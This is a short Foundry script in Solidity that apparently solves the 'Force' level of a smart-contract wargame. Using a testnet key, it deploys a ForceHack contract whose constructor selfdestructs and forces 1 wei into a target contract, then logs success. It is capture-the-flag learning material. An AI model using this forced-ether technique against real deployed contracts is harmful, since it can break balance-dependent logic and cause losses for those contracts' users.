//SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import {ForceHack} from "src/hack/ForceHack.sol";

contract ForceScript is Script {
    function run() external {
        address force = vm.envAddress("FORCE_ADDRESS");
        uint attackerKey = vm.envUint("TESTNET_PRIVATE_KEY_1");

        vm.startBroadcast(attackerKey);

        // Deploy the ForceHack contract.
        // "selfdestruct" function in the constructor will send ether stored in the contract to the supplied address.
        new ForceHack{value: 1 wei}(payable(force));

        vm.stopBroadcast();
        console2.log("SUCCESS!!! Submit the instance.");
    }
}
